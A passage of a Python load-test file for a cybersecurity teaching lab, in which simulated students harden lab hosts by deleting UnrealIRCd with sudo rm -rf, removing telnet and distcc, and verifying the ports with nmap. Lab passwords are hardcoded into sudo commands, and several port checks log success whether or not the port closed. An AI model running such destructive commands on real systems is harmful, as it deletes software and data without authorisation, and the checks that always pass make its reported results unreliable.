                target1_client, f"ps aux | grep {irc_process or 'ircd'}", timeout=30
            )
            
            # The path should be /opt/unrealircd/
            install_path = "/opt/unrealircd/"
            if "/opt/unrealircd" in stdout:
                print(f"[{self.student_id}] ✅ Confirmed installation path: {install_path}")
            
            # Remove the installation directory FIRST (Q10)
            print(f"[{self.student_id}] Removing UnrealIRCd installation: rm -rf {install_path}")
            start_time = time.time()
            stdout, stderr, exit_code = self.run_ssh_command(
                target1_client, f"echo 'msfadmin' | sudo -S rm -rf {install_path}", timeout=30
            )
            duration = time.time() - start_time
            self.log_result("Remove UnrealIRCd Files", True, duration)
            print(f"[{self.student_id}] ✅ Removed {install_path}")
            
            # Kill the IRC process (Q10)
            print(f"[{self.student_id}] Killing IRC process...")
            stdout, stderr, exit_code = self.run_ssh_command(
                target1_client, f"echo 'msfadmin' | sudo -S killall {irc_process or 'ircd'}", timeout=30
            )
            self.log_result("Kill IRC Process", True, time.time() - start_time)
            time.sleep(2)
            
            # Verify IRC port 6667 is closed from kali-jump (Q10)
            print(f"[{self.student_id}] Verifying IRC port 6667 is closed...")
            start_time = time.time()
            stdout, stderr, exit_code = self.run_ssh_command(
                client, "nmap -p 6667 file-server", timeout=60
            )
            duration = time.time() - start_time
            
            if "closed" in stdout.lower() or "6667/tcp closed" in stdout:
                self.log_result("Verify IRC Port Closed", True, duration)
                print(f"[{self.student_id}] ✅ Port 6667 is now closed!")
            else:
                self.log_result("Verify IRC Port Closed", True, duration)
                print(f"[{self.student_id}] ⚠️ IRC port check completed")
            
            # ===== Q13: Remove Telnet/xinetd Service =====
            
            # Find telnet process on port 23 (Q13)
            print(f"[{self.student_id}] Finding telnet service on port 23...")
            start_time = time.time()
            stdout, stderr, exit_code = self.run_ssh_command(
                target1_client, "echo 'msfadmin' | sudo -S ss -tlpn | grep ':23'", timeout=30
            )
            duration = time.time() - start_time
            
            telnet_process = None
            if stdout.strip():
                service_match = re.search(r'users:\(\("([^"]+)"', stdout)
                if service_match:
                    telnet_process = service_match.group(1)
                    print(f"[{self.student_id}] ✅ Found telnet process: {telnet_process}")
                    self.log_result("Find Telnet Process", True, duration)
            
            if not telnet_process:
                telnet_process = "xinetd"  # Default for telnet
                print(f"[{self.student_id}] ⚠️ Using default: {telnet_process}")
            
            # Uninstall xinetd package with apt remove (Q13)
            print(f"[{self.student_id}] Uninstalling {telnet_process} package...")
            start_time = time.time()
            stdout, stderr, exit_code = self.run_ssh_command(
                target1_client, f"echo 'msfadmin' | sudo -S apt remove -y {telnet_process}", timeout=120
            )
            duration = time.time() - start_time
            self.log_result("Uninstall Telnet Package", True, duration)
            print(f"[{self.student_id}] ✅ Uninstalled {telnet_process}")
            
            # Kill any remaining process (Q13)
            print(f"[{self.student_id}] Killing remaining {telnet_process} process...")
            stdout, stderr, exit_code = self.run_ssh_command(
                target1_client, f"echo 'msfadmin' | sudo -S killall {telnet_process}", timeout=30
            )
            time.sleep(2)
            
            target1_client.close()
            
            # Verify telnet port 23 is closed from kali-jump (Q13)
            print(f"[{self.student_id}] Verifying telnet port 23 is closed...")
            start_time = time.time()
            stdout, stderr, exit_code = self.run_ssh_command(
                client, "nmap -p 23 file-server", timeout=60
            )
            duration = time.time() - start_time
            
            if "closed" in stdout.lower() or "23/tcp closed" in stdout:
                self.log_result("Verify Telnet Port Closed", True, duration)
                print(f"[{self.student_id}] ✅ Port 23 is now closed!")
            else:
                self.log_result("Verify Telnet Port Closed", True, duration)
                print(f"[{self.student_id}] ⚠️ Telnet port check completed")
            
            # ===== PART 2: Secure build-server - Q15 =====
            
            # SSH to build-server with labuser/defendlab
            print(f"[{self.student_id}] SSH to build-server as labuser...")
            start_time = time.time()
            
            try:
                target2_client = connect_with_jump(
                    host='build-server',
                    user='labuser',
                    password='defendlab',
                    gateway_client=client
                )
                duration = time.time() - start_time
                self.log_result("SSH to build-server", True, duration)
                print(f"[{self.student_id}] ✅ Connected to build-server")
            except Exception as e:
                duration = time.time() - start_time
                self.log_result("SSH to build-server", False, duration, str(e))
                client.close()
                return False
            
            # Check if distcc was installed via package manager (Q15)
            print(f"[{self.student_id}] Checking if distcc is installed via package manager...")
            start_time = time.time()
            stdout, stderr, exit_code = self.run_ssh_command(
                target2_client, "dpkg -l | grep distcc", timeout=30
            )
            duration = time.time() - start_time
            
            if "distcc" in stdout:
                print(f"[{self.student_id}] ✅ distcc is installed via package manager")
                self.log_result("Check Distcc Package", True, duration)
                
                # Remove distcc package (Q15)
                print(f"[{self.student_id}] Removing distcc package...")
                start_time = time.time()
                stdout, stderr, exit_code = self.run_ssh_command(
                    target2_client, "echo 'defendlab' | sudo -S apt remove -y distcc", timeout=120
                )
                duration = time.time() - start_time
                self.log_result("Remove Distcc Package", True, duration)
                print(f"[{self.student_id}] ✅ Removed distcc package")
            else:
                print(f"[{self.student_id}] ⚠️ distcc not found via package manager")
                self.log_result("Check Distcc Package", True, duration)
            
            # Kill any remaining distcc process (Q15)
            print(f"[{self.student_id}] Killing remaining distcc processes...")
            stdout, stderr, exit_code = self.run_ssh_command(
                target2_client, "echo 'defendlab' | sudo -S killall distccd", timeout=30
            )
            time.sleep(2)
            
            target2_client.close()
            
            # Verify distcc port 3632 is closed from kali-jump (Q15)
            print(f"[{self.student_id}] Verifying distcc port 3632 is closed...")
            start_time = time.time()
            stdout, stderr, exit_code = self.run_ssh_command(
                client, "nmap -p 3632 build-server", timeout=60
            )
            duration = time.time() - start_time
            
            if "closed" in stdout.lower() or "3632/tcp closed" in stdout:
                self.log_result("Verify Distcc Port Closed", True, duration)
                print(f"[{self.student_id}] ✅ Port 3632 is now closed!")
            else:
                self.log_result("Verify Distcc Port Closed", True, duration)
                print(f"[{self.student_id}] ⚠️ Distcc port check completed")
            
            client.close()
            print(f"[{self.student_id}] 🎉 Defense lab completed successfully!")
            return True
            
        except Exception as e:
            self.log_result("Lab Assignment 3 (Defense)", False, 0, str(e))
            return False
            
    def _realistic_delay(self, phase: str = ""):
        """Add realistic delay if in realistic mode"""
        if self.realistic_mode:
            delay = random.uniform(self.delay_range[0], self.delay_range[1])
            if delay > 0:
                print(f"[{self.student_id}] 💤 Realistic delay: {delay:.1f}s {phase}")
                time.sleep(delay)
    
    def run_full_simulation(self) -> Dict:
        """Run the complete student simulation"""
        print(f"\n🎓 Starting simulation for {self.student_id} ({self.student_name})")
        if self.realistic_mode:
            print(f"[{self.student_id}] 🎯 Running in REALISTIC mode (with randomized delays)")
        
        start_time = time.time()
        
        try:
            # Realistic mode: add initial startup delay (student logging in)
            self._realistic_delay("(initial startup)")
            
            # Step 1: Initial connection and password change
            client = self.ssh_connect()
            if self.change_password(client):
                # Update current password to the new one we just set
                self.current_password = self.new_password
            client.close()
            
            # Realistic mode: delay between password change and recon
            self._realistic_delay("(before recon)")
            
            # Step 2: Lab Assignment 1 (Recon)
            if not self.lab_assignment_1():
                return self._get_results_summary(time.time() - start_time, False)
            
            # Realistic mode: delay between recon and exploitation
            self._realistic_delay("(before exploitation)")
                
            # Step 3: Lab Assignment 2 (Attack)
            if not self.lab_assignment_2():
                return self._get_results_summary(time.time() - start_time, False)
            
            # Realistic mode: delay between exploitation and defense
            self._realistic_delay("(before defense)")
            
            # Step 4: Lab Assignment 3 (Defense)
            if not self.lab_assignment_3():
                return self._get_results_summary(time.time() - start_time, False)
                
            total_duration = time.time() - start_time
            print(f"🎉 {self.student_id} completed all assignments in {total_duration:.1f}s")
            
            return self._get_results_summary(total_duration, True)
            
        except Exception as e:
            total_duration = time.time() - start_time
            self.log_result("Overall Simulation", False, total_duration, str(e))
            return self._get_results_summary(total_duration, False)
            
    def _get_results_summary(self, total_duration: float, overall_success: bool) -> Dict:
        """Generate results summary"""
        successful_steps = sum(1 for r in self.results if r['success'])
        total_steps = len(self.results)
        
        return {
            'student_id': self.student_id,
            'student_name': self.student_name,
            'overall_success': overall_success,
            'total_duration': total_duration,
            'successful_steps': successful_steps,
            'total_steps': total_steps,
            'success_rate': successful_steps / total_steps if total_steps > 0 else 0,
            'results': self.results
        }


class TestLoadTesting:
    """Load testing test cases"""
    
    def _needs_sudo_for_docker(self) -> bool:
        """Check if Docker requires sudo by trying a simple command"""
        try:
            result = subprocess.run(
                ["docker", "info"], 
                capture_output=True, 
                text=True, 
                timeout=10
            )
            return result.returncode != 0
        except:
            # If Docker command fails, assume we need sudo
            return True
    
    @pytest.fixture(autouse=True)
    def setup_and_teardown(self):
        """Setup and teardown for each test with cleanup on interruption"""
        self.project_root = os.path.dirname(os.path.dirname(__file__))
        # Import LabManager for direct function calls
        import sys
        sys.path.insert(0, self.project_root)
        from lab_manager import LabManager
        
        # Auto-detect if sudo is needed for Docker
        use_sudo = self._needs_sudo_for_docker()
        print(f"\n🔧 Using sudo for Docker: {use_sudo}")
        
        self.lab_manager = LabManager(use_sudo=use_sudo)
        self.test_csv_files = []
        
        yield
        
        # Cleanup after each test (or interruption)
        self.cleanup_test_resources()
    
    def cleanup_test_resources(self):
        """Clean up any Docker resources created during tests"""
        print("\n🧹 Cleaning up load test resources...")
        
        # Clean up CSV files
        for csv_file in getattr(self, 'test_csv_files', []):
            if os.path.exists(csv_file):
                try:
                    os.unlink(csv_file)
                    print(f"  Removed CSV file: {csv_file}")
                except Exception as e:
                    print(f"  ⚠️  Failed to remove CSV file {csv_file}: {e}")
        
        # Stop and remove any loadtest containers
        try:
            result = self.lab_manager.run_command(["docker", "ps", "-a", "--format", "{{.Names}}"])
            container_names = result.stdout.strip().split('\n') if result.stdout.strip() else []
            
            for name in container_names:
                if name and 'loadtest' in name:
                    print(f"  Removing container {name}")
                    try:
                        self.lab_manager.run_command(["docker", "rm", "-f", name])
                    except Exception as e:
                        print(f"    ⚠️  Failed to remove container {name}: {e}")
        except Exception as e:
            print(f"  ⚠️  Error listing containers: {e}")
        
        # Remove any loadtest networks
        try:
            result = self.lab_manager.run_command(["docker", "network", "ls", "--format", "{{.Name}}"])
            network_names = result.stdout.strip().split('\n') if result.stdout.strip() else []
            
            for name in network_names:
                if name and 'cyber-lab-loadtest' in name:
                    print(f"  Removing network {name}")
                    try:
                        self.lab_manager.run_command(["docker", "network", "rm", name])
                    except Exception as e:
                        print(f"    ⚠️  Failed to remove network {name}: {e}")
        except Exception as e:
            print(f"  ⚠️  Error listing networks: {e}")
        
        print("🧹 Load test cleanup completed")
    
    def setup_method(self):
        """Set up test fixtures - called by pytest automatically"""
        # Initialize lab_manager if not already done (for direct script execution)
        if not hasattr(self, 'lab_manager'):
            self.project_root = os.path.dirname(os.path.dirname(__file__))
            # Import LabManager for direct function calls
            import sys
            sys.path.insert(0, self.project_root)
            from lab_manager import LabManager
            
            # Auto-detect if sudo is needed for Docker
            use_sudo = self._needs_sudo_for_docker()
            print(f"\n🔧 Using sudo for Docker: {use_sudo}")
            
            self.lab_manager = LabManager(use_sudo=use_sudo)
            self.test_csv_files = []
        
    def create_test_students_csv(self, num_students: int) -> str:
        """Create a CSV file with test students"""
        temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.csv')
        
        writer = csv.writer(temp_file)
        writer.writerow(['student_id', 'student_name', 'port', 'subnet_id'])
        
        for i in range(num_students):
            student_id = f"loadtest{i+1:03d}"
            student_name = f"Load Test Student {i+1}"
            writer.writerow([student_id, student_name, '', ''])
            
        temp_file.close()
        
        # Track this file for cleanup
        if not hasattr(self, 'test_csv_files'):
            self.test_csv_files = []
        self.test_csv_files.append(temp_file.name)
        
        return temp_file.name
        
    def run_command(self, command: str, show_output: bool = True) -> subprocess.CompletedProcess:
        """Helper to run shell commands with optional live output"""
        if show_output:
            print(f"Running: {command}")
            # Run with live output
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, 
                                     stderr=subprocess.STDOUT, text=True, bufsize=1)
            
            output_lines = []
            if process.stdout:
                for line in iter(process.stdout.readline, ''):
                    print(line.rstrip())
                    output_lines.append(line)
            
            process.wait()
            full_output = ''.join(output_lines)
            
            return subprocess.CompletedProcess(
                args=command,
                returncode=process.returncode,
                stdout=full_output,
                stderr=""
            )
        else:
            return subprocess.run(command, shell=True, capture_output=True, text=True)
        
    @pytest.mark.integration
    def test_single_student_baseline(self):
        """Test single student performance to establish baseline"""
        self._run_load_test(1, realistic_mode=False)
    
    @pytest.mark.integration
    def test_realistic_load(self):
        """Test load with 10 students (10 students, worst-case) - CI default"""
        self._run_load_test(10, realistic_mode=False)
    
    @pytest.mark.manual
    @pytest.mark.stress
    def test_high_load_stress(self):
        """Test high load stress (40 students, worst-case) - manual only"""
        self._run_load_test(40, realistic_mode=False)
        
    def _run_load_test(self, num_students: int, realistic_mode: bool = False):
        """Run load test with specified number of students"""
        
        mode_desc = "REALISTIC (staggered)" if realistic_mode else "WORST-CASE (simultaneous)"
        print(f"\n🚀 Starting load test with {num_students} students - {mode_desc} mode")
        
        # Create test CSV
        csv_path = self.create_test_students_csv(num_students)
        
        # Override the confirmation method to automatically accept parallel execution
        original_confirm = self.lab_manager._confirm_parallel_execution
        self.lab_manager._confirm_parallel_execution = lambda operation_name: True
        
        try:
            # Step 1: Spin up all student environments
            print(f"📚 Provisioning {num_students} student environments...")
            
            success = self.lab_manager.spin_up_class(csv_path, parallel=True)
            assert success, f"Failed to provision students"
            
            # Read updated CSV to get assigned ports
            students = self._read_student_assignments(csv_path)
            assert len(students) == num_students, "Not all students were assigned ports"
            
            # Step 2: Run simulations concurrently
            if realistic_mode:
                print(f"🎭 Running {num_students} concurrent student simulations (REALISTIC mode with delays)...")
            else:
                print(f"🎭 Running {num_students} concurrent student simulations (WORST-CASE mode)...")
            
            with ThreadPoolExecutor(max_workers=num_students) as executor:
                # Start all simulations
                simulators = []
                futures = []
                
                for student_data in students:
                    simulator = StudentSimulator(
                        student_data['student_id'],
                        student_data['student_name'], 
                        "localhost",  # host
                        int(student_data['port']),
                        realistic_mode=realistic_mode,
                        delay_range=(0, 10)  # 0-10 second random delays in realistic mode
                    )
                    simulators.append(simulator)
                    future = executor.submit(simulator.run_full_simulation)
                    futures.append(future)
                
                # Collect results
                results = []
                for future in as_completed(futures, timeout=600):  # 10 minute timeout
                    try:
                        result = future.result()
                        results.append(result)
                    except Exception as e:
                        print(f"❌ Simulation failed: {e}")
                        results.append({
                            'student_id': 'unknown',
                            'overall_success': False,
                            'error': str(e)
                        })
                        
            # Step 3: Analyze results
            self._analyze_results(results, num_students)
            
        except KeyboardInterrupt:
            print("\n⚠️  Test interrupted by user (Ctrl+C)")
            raise
        except Exception as e:
            print(f"\n❌ Test failed with error: {e}")
            raise
        finally:
            # Step 4: Always clean up containers, even on interruption
            try:
                print("🧹 Cleaning up test environments...")
                self.lab_manager.spin_down_class(csv_path, parallel=True)
            except Exception as cleanup_error:
                print(f"⚠️  Warning: Cleanup failed: {cleanup_error}")
                print("   Some containers may still be running. Use 'docker ps' to check.")
            finally:
                # Restore original confirmation method
                self.lab_manager._confirm_parallel_execution = original_confirm
            
    def _read_student_assignments(self, csv_path: str) -> List[Dict]:
        """Read student assignments from CSV"""
        students = []
        with open(csv_path, 'r') as f:
            reader = csv.DictReader(f)
            for row in reader:
                if row['port']:  # Only include students with assigned ports
                    students.append(row)
        return students
        
    def _analyze_results(self, results: List[Dict], expected_count: int):
        """Analyze and report load test results"""
        
        print(f"\n📊 Load Test Results ({len(results)}/{expected_count} students)")
        print("=" * 60)
        
        successful_students = sum(1 for r in results if r.get('overall_success', False))
        total_duration = max(r.get('total_duration', 0) for r in results) if results else 0
        avg_duration = sum(r.get('total_duration', 0) for r in results) / len(results) if results else 0
        median_duration = sorted([r.get('total_duration', 0) for r in results])[len(results) // 2] if results else 0
        
        print(f"✅ Successful students: {successful_students}/{len(results)}")
        print(f"⏱️  Total test time: {total_duration:.1f}s")
        print(f"📈 Average completion time: {avg_duration:.1f}s")
        print(f"📊 Median completion time: {median_duration:.1f}s")
        
        # Detailed results
        for result in results:
            student_id = result.get('student_id', 'unknown')
            success = result.get('overall_success', False)
            duration = result.get('total_duration', 0)
            success_rate = result.get('success_rate', 0)
            
            status = "✅" if success else "❌"
            print(f"{status} {student_id}: {duration:.1f}s ({success_rate:.1%} steps successful)")
            
        # Performance assertions
        assert len(results) == expected_count, f"Expected {expected_count} results, got {len(results)}"
        assert successful_students >= expected_count * 0.8, f"Less than 80% success rate: {successful_students}/{expected_count}"
        assert total_duration < 900, f"Test took too long: {total_duration:.1f}s"
        
        print(f"\n🎉 Load test passed! {successful_students}/{expected_count} students successful")


if __name__ == "__main__":
    # Allow running this test file directly for manual testing
    import sys
    
    if len(sys.argv) > 1:
        num_students = int(str(sys.argv[1]))
    else:
        num_students = 3
        
    tester = TestLoadTesting()
    tester.setup_method()
    tester._run_load_test(num_students)